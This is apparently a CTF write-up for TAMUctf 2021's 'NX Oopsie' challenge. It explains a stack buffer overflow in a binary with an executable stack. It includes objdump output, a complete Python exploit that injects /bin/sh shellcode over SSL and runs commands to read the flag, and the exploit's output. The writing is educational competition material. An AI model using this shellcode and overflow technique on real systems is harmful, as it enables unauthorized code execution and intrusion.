---
title: "TAMUctf 2021 NX Oopsie Solution"
slug: "nx-oopsie-writeup"
date: "2021-04-26 11:03:00.000000"
author_name: "Javantea"
author_email: "jvoss@altsci.com"
draft: false
toc: false
images:
---

TAMUctf 2021
[NX Oopsie](https://ctftime.org/task/15795) - 100 points

>    Attack this binary and get the flag!
>    [nx-oopsie](https://tamuctf.com/static-files/nx-oopsie)
>    `openssl s_client -connect tamuctf.com:443 -servername nx-oopsie -quiet`

I spent way too much time on this problem, stopping to work on other problems and coming back time and time again. This is a simple stack overflow on x86-64 with NX and PIE. How do you exploit it? It uses [musl libc](https://www.musl-libc.org/) so running it on a normal Linux machine doesn't work. The breakthrough came when I realized that they were giving `RBP` and had a think. There was no way to find an address in the executable or libc. How then? How do you exploit if you can't ROP? The answer is in the binary. 

```
objdump -x nx-oopsie

nx-oopsie:     file format elf64-x86-64
nx-oopsie
architecture: i386:x86-64, flags 0x00000150:
HAS_SYMS, DYNAMIC, D_PAGED
start address 0x0000000000001080

Program Header:
    PHDR off    0x0000000000000040 vaddr 0x0000000000000040 paddr 0x0000000000000040 align 2**3
         filesz 0x0000000000000230 memsz 0x0000000000000230 flags r--
  INTERP off    0x0000000000000270 vaddr 0x0000000000000270 paddr 0x0000000000000270 align 2**0
         filesz 0x0000000000000019 memsz 0x0000000000000019 flags r--
    LOAD off    0x0000000000000000 vaddr 0x0000000000000000 paddr 0x0000000000000000 align 2**12
         filesz 0x0000000000000608 memsz 0x0000000000000608 flags r--
    LOAD off    0x0000000000001000 vaddr 0x0000000000001000 paddr 0x0000000000001000 align 2**12
         filesz 0x0000000000000309 memsz 0x0000000000000309 flags r-x
    LOAD off    0x0000000000002000 vaddr 0x0000000000002000 paddr 0x0000000000002000 align 2**12
         filesz 0x000000000000014c memsz 0x000000000000014c flags r--
    LOAD off    0x0000000000002de0 vaddr 0x0000000000003de0 paddr 0x0000000000003de0 align 2**12
         filesz 0x0000000000000228 memsz 0x0000000000000290 flags rw-
 DYNAMIC off    0x0000000000002e10 vaddr 0x0000000000003e10 paddr 0x0000000000003e10 align 2**3
         filesz 0x0000000000000180 memsz 0x0000000000000180 flags rw-
EH_FRAME off    0x000000000000205c vaddr 0x000000000000205c paddr 0x000000000000205c align 2**2
         filesz 0x0000000000000034 memsz 0x0000000000000034 flags r--
   STACK off    0x0000000000000000 vaddr 0x0000000000000000 paddr 0x0000000000000000 align 2**4
         filesz 0x0000000000000000 memsz 0x0000000000000000 flags rwx
   RELRO off    0x0000000000002de0 vaddr 0x0000000000003de0 paddr 0x0000000000003de0 align 2**0
         filesz 0x0000000000000220 memsz 0x0000000000000220 flags r--

Dynamic Section:
  NEEDED               libc.musl-x86_64.so.1
```

Notice anything? The stack is executable. We're back to 200X style exploitation of buffer overflows. The only complication is that we have to use SSL and the stack address they gave us. Lucky for us, that is easy in 2021. Below is my working exploit and it's output as I put it into my exploits. I used shellcode from [Shell Storm](http://shell-storm.org/shellcode/files/shellcode-806.php) as seen in the exploit.

```python
#!/usr/bin/env python3
"""
Nx-Oopsie Solution
by Javantea
Apr 25, 2021

http://shell-storm.org/shellcode/files/shellcode-806.php
"""
import ssl
import socket
import struct

sc = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

ss = ssl.wrap_socket(s)
ss.server_hostname = 'nx-oopsie'
ss.connect(('tamuctf.com', 443))
value = ss.recv(1024)
b"Psst! I heard you might need this...: 0x7fffc19a9dd0\nWhat's your name? "
print(value)

addr = int(value[40:value.index(b"\n")], 16)

sc_addr = addr - 0x40

pl = (0x48 - len(sc))
padding = b'A' * pl
if pl < 0:
    print("Warning: Shellcode is too long. make it smaller.")
name = sc + padding + struct.pack('<Q', sc_addr) + b'\n'

ss.send(name)
print("Sent payload", name)
#rr = ss.recv(1024)
#print("Received data 1", rr)

ss.send(b'ls\n')
rr = ss.recv(1024)
print("Received data 2", rr)
ss.send(b'df\n')
rr = ss.recv(1024)
print("Received data 3", rr)
ss.send(b'echo arf arf arf\n')
rr = ss.recv(1024)
print("Received data 4", rr)
ss.send(b'cat flag.txt\n')
rr = ss.recv(1024)
print("Received data 5", rr)

while rr != b'':
    rr = ss.recv(1024)
    print("Received data 6", rr)

ss.close()

"""
python3 nx-oopsie1.py 
b"Psst! I heard you might need this...: 0x7fffee665ef0\nWhat's your name? "
Sent payload b'1\xc0H\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xffH\xf7\xdbST_\x99RWT^\xb0;\x0f\x05AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb0^f\xee\xff\x7f\x00\x00\n'
Received data 2 b'flag.txt\n'
Received data 3 b'Filesystem           1K-blocks      Used Available Use% Mounted on\n'
Received data 4 b'overlay               48884348   9350568  36896060  20% /\ntmpfs                    65536         0     65536   0% /dev\ntmpfs                 32984124         0  32984124   0% /sys/fs/cgroup\nshm                      65536         0     65536   0% /dev/shm\n/dev/sda1             48884348   9350568  36896060  20% /etc/resolv.conf\n/dev/sda1             48884348   9350568  36896060  20% /etc/hostname\n/dev/sda1             48884348   9350568  36896060  20% /etc/hosts\ntmpfs                 32984124         0  32984124   0% /proc/acpi\ntmpfs                    65536         0     65536   0% /proc/kcore\ntmpfs                    65536         0     65536   0% /proc/keys\ntmpfs                    65536         0     65536   0% /proc/timer_list\ntmpfs                    65536         0     65536   0% /proc/sched_debug\ntmpfs                 32984124         0  32984124   0% /proc/scsi\ntmpfs                 32984124         0  32984124   0% /sys/firmware\n'
Received data 5 b'arf arf arf\n'
Received data 6 b'gigem{0oP5_al1_3xeCu7aB1e}\n'
^CTraceback (most recent call last):
  File "nx-oopsie1.py", line 45, in <module>
    rr = ss.recv(1024)
  File "/usr/lib/python3.8/ssl.py", line 1226, in recv
    return self.read(buflen)
  File "/usr/lib/python3.8/ssl.py", line 1101, in read
    return self._sslobj.read(len)
KeyboardInterrupt


Flag received is gigem{0oP5_al1_3xeCu7aB1e}
"""

```

The flag is `gigem{0oP5_al1_3xeCu7aB1e}`.


